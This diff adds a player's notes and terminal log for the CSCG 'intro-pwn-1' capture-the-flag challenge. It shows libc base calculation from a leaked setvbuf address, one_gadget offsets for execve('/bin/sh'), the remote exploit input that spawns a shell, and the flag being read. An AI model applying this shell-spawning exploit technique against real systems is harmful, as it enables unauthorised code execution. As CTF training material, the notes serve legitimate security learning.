@@ -1,0 +1,231 @@
+Docker:
+docker build . -t intro-pwn1
+docker run -p 1024:1024 intro-pwn1
+docker ps
+
+sudo docker-compose up --build
+sudo docker exec -it ctf /bin/bash
+
+
+cp libc from container
+libc_setvbuf_addr -> objdump -D libc | grep setvbuf
+one_gadget_addr -> one_gadget libc to find possible shell function calls
+
+libc_base_addr = hex(leaked_setvbuf_addr - libc_setvbuf_addr)
+hex(libc_base_addr + one_gadget_addr)
+
+trial and error for the correct one_gadget address (execve)
+
+
+Used gdb commands:
+print exit
+vmmap
+vmmap 0x7ffff7dcdd60
+tele 15
+
+
+
+
+Local:
+
+┌──(kali㉿kali)-[~/Desktop/cscg/pwn_1]
+└─$ objdump -D libc.so.6 | grep setvbuf
+0000000000081670 <_IO_setvbuf@@GLIBC_2.2.5>:
+   81691:       75 5d                   jne    816f0 <_IO_setvbuf@@GLIBC_2.2.5+0x80>
+   816a7:       74 1c                   je     816c5 <_IO_setvbuf@@GLIBC_2.2.5+0x55>
+   816b2:       0f 85 88 01 00 00       jne    81840 <_IO_setvbuf@@GLIBC_2.2.5+0x1d0>
+   816cd:       0f 84 ed 00 00 00       je     817c0 <_IO_setvbuf@@GLIBC_2.2.5+0x150>
+   816d7:       0f 84 cb 00 00 00       je     817a8 <_IO_setvbuf@@GLIBC_2.2.5+0x138>
+   816e0:       74 3e                   je     81720 <_IO_setvbuf@@GLIBC_2.2.5+0xb0>
+   816e8:       e9 81 00 00 00          jmp    8176e <_IO_setvbuf@@GLIBC_2.2.5+0xfe>
+   816f4:       0f 84 c6 00 00 00       je     817c0 <_IO_setvbuf@@GLIBC_2.2.5+0x150>
+   816fe:       0f 84 a4 00 00 00       je     817a8 <_IO_setvbuf@@GLIBC_2.2.5+0x138>
+   81707:       74 17                   je     81720 <_IO_setvbuf@@GLIBC_2.2.5+0xb0>
+   8172b:       0f 84 af 00 00 00       je     817e0 <_IO_setvbuf@@GLIBC_2.2.5+0x170>
+   81752:       0f 86 d8 00 00 00       jbe    81830 <_IO_setvbuf@@GLIBC_2.2.5+0x1c0>
+   81771:       75 9c                   jne    8170f <_IO_setvbuf@@GLIBC_2.2.5+0x9f>
+   81783:       75 8a                   jne    8170f <_IO_setvbuf@@GLIBC_2.2.5+0x9f>
+   81792:       0f 8e 77 ff ff ff       jle    8170f <_IO_setvbuf@@GLIBC_2.2.5+0x9f>
+   8179d:       e9 6d ff ff ff          jmp    8170f <_IO_setvbuf@@GLIBC_2.2.5+0x9f>
+   817b5:       e9 77 ff ff ff          jmp    81731 <_IO_setvbuf@@GLIBC_2.2.5+0xc1>
+   817cb:       0f 85 60 ff ff ff       jne    81731 <_IO_setvbuf@@GLIBC_2.2.5+0xc1>
+   817d4:       eb 98                   jmp    8176e <_IO_setvbuf@@GLIBC_2.2.5+0xfe>
+   817e8:       75 84                   jne    8176e <_IO_setvbuf@@GLIBC_2.2.5+0xfe>
+   8180b:       76 3d                   jbe    8184a <_IO_setvbuf@@GLIBC_2.2.5+0x1da>
+   81817:       0f 88 c5 fe ff ff       js     816e2 <_IO_setvbuf@@GLIBC_2.2.5+0x72>
+   81825:       e9 44 ff ff ff          jmp    8176e <_IO_setvbuf@@GLIBC_2.2.5+0xfe>
+   81835:       e9 1e ff ff ff          jmp    81758 <_IO_setvbuf@@GLIBC_2.2.5+0xe8>
+   81845:       e9 6e fe ff ff          jmp    816b8 <_IO_setvbuf@@GLIBC_2.2.5+0x48>
+   8184f:       eb bc                   jmp    8180d <_IO_setvbuf@@GLIBC_2.2.5+0x19d>
+   8807d:       e9 ee 95 ff ff          jmp    81670 <_IO_setvbuf@@GLIBC_2.2.5>
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Desktop/cscg/pwn_1]
+└─$ echo "0x81670"         
+0x81670
+┌──(kali㉿kali)-[~/Desktop/cscg/pwn_1]
+└─$ python                                           
+Python 3.9.10 (main, Feb 22 2022, 13:54:07) 
+[GCC 11.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> hex(0x7faf96179670 - 0x81670)
+'0x7faf960f8000'
+>>> 
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Desktop/cscg/pwn_1]
+└─$ one_gadget libc.so.6               
+0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
+constraints:
+  rsp & 0xf == 0
+  rcx == NULL
+  rbp == NULL || (u16)[rbp] == NULL
+
+0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
+constraints:
+  address rbp-0x78 is writable
+  [r10] == NULL || r10 == NULL
+  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
+
+0xebcf5 execve("/bin/sh", r10, rdx)
+constraints:
+  address rbp-0x78 is writable
+  [r10] == NULL || r10 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xebcf8 execve("/bin/sh", rsi, rdx)
+constraints:
+  address rbp-0x78 is writable
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Desktop/cscg/pwn_1]
+└─$ python
+Python 3.9.10 (main, Feb 22 2022, 13:54:07) 
+[GCC 11.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> hex(0x7faf960f8000 + 0xebcf1)
+'0x7faf961e3cf1'
+>>> hex(0x7faf960f8000 + 0xebcf5)
+'0x7faf961e3cf5'
+>>> hex(0x7faf960f8000 + 0xebcf8)
+'0x7faf961e3cf8'
+>>> hex(0x7faf960f8000 + 0xebcf8:016x)
+  File "<stdin>", line 1
+    hex(0x7faf960f8000 + 0xebcf8:016x)
+                                ^
+SyntaxError: invalid syntax
+>>> hex(0x7f5b48b10670 - 0x81670)
+'0x7f5b48a8f000'
+>>> hex(0x7f5b48a8f000 + 0xebcf1)
+'0x7f5b48b7acf1'
+>>> hex(7f5d95c53670 - 0x81670)
+  File "<stdin>", line 1
+    hex(7f5d95c53670 - 0x81670)
+         ^
+SyntaxError: invalid syntax
+>>> hex(0x7f5d95c53670 - 0x81670)
+'0x7f5d95bd2000'
+>>> hex(0x7f5d95bd2000 + 0xebcf5)
+'0x7f5d95cbdcf5'
+>>> hex(0x7f4586a0b670 - 0x81670)
+'0x7f458698a000'
+>>> hex(0x7f458698a000 + 0xebcf8)
+'0x7f4586a75cf8'
+>>> hex(0x7f1c24b70670 - 0x81670)
+'0x7f1c24aef000'
+>>> hex(0x7f1c24aef000 + 0xebcf8)
+'0x7f1c24bdacf8'
+>>> 
+
+
+
+
+Remote:
+
+┌──(kali㉿kali)-[~/Desktop/cscg/pwn_1]
+└─$ ncat --ssl 41ac18969473eb5b33b894db-intro-pwn-1.challenge.master.cscg.live 31337                                                                 130 ⨯
+-----------------------------------------
+| Look                                   |
+| If you had                             |
+| One shot                               |
+| Or one opportunity                     |
+| To seize everything you ever wanted    |
+| In one moment                          |
+| Would you capture it                   |
+| Or just let it slip?                   |
+-----------------------------------------
+
+It's dangerous to go alone! Take this: 7f1c24b70670
+
+Enter your shot: 7f1c24bdacf8
+
+
+Good luck
+ls
+bin
+boot
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+ls -al 
+total 56
+drwxr-xr-x    1 root root 4096 Mar 30 16:07 .
+drwxr-xr-x    1 root root 4096 Mar 30 16:07 ..
+-rwxr-xr-x    1 root root    0 Mar 30 16:07 .dockerenv
+lrwxrwxrwx    1 root root    7 Jan 30 11:49 bin -> usr/bin
+drwxr-xr-x    2 root root 4096 Nov  8 11:34 boot
+drwxr-xr-x    5 root root  360 Mar 30 16:07 dev
+drwxr-sr-x    1 root root 4096 Mar 30 16:07 etc
+drwxr-sr-x    1 root root 4096 Mar  4 11:43 home
+lrwxrwxrwx    1 root root    7 Jan 30 11:49 lib -> usr/lib
+lrwxrwxrwx    1 root root    9 Jan 30 11:49 lib32 -> usr/lib32
+lrwxrwxrwx    1 root root    9 Jan 30 11:49 lib64 -> usr/lib64
+lrwxrwxrwx    1 root root   10 Jan 30 11:49 libx32 -> usr/libx32
+drwxr-xr-x    2 root root 4096 Jan 30 11:49 media
+drwxr-xr-x    2 root root 4096 Jan 30 11:49 mnt
+drwxr-xr-x    2 root root 4096 Jan 30 11:49 opt
+dr-xr-xr-x 8319 root root    0 Mar 30 16:07 proc
+drwx------    2 root root 4096 Jan 30 11:52 root
+drwxr-xr-x    5 root root 4096 Jan 30 11:52 run
+lrwxrwxrwx    1 root root    8 Jan 30 11:49 sbin -> usr/sbin
+drwxr-xr-x    2 root root 4096 Jan 30 11:49 srv
+dr-xr-xr-x   13 root root    0 Mar 30 16:07 sys
+drwxrwsrwt    1 root root 4096 Mar  4 11:43 tmp
+drwxr-sr-x    1 root root 4096 Mar  4 11:42 usr
+drwxr-sr-x    1 root root 4096 Mar  4 11:43 var
+id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+cd home/  
+ls -al 
+total 12
+drwxr-sr-x 1 root root 4096 Mar  4 11:43 .
+drwxr-xr-x 1 root root 4096 Mar 30 16:07 ..
+drwxr-s--- 1 ctf  ctf  4096 Mar  4 11:43 ctf
+cd ctf
+ls -al 
+total 44
+drwxr-s--- 1 ctf  ctf   4096 Mar  4 11:43 .
+drwxr-sr-x 1 root root  4096 Mar  4 11:43 ..
+-rw-r--r-- 1 ctf  ctf    220 Jan  6 16:23 .bash_logout
+-rw-r--r-- 1 ctf  ctf   3771 Jan  6 16:23 .bashrc
+-rw-r--r-- 1 ctf  ctf    807 Jan  6 16:23 .profile
+-rw-r--r-- 1 root root    40 Mar  4 11:23 flag
+-rwxr-xr-x 1 root root 16808 Mar  4 11:23 pwn1
+cat flag
+CSCG{seems_l1ke_y0u_t00k_your_0ne_sh0t!}^C
+
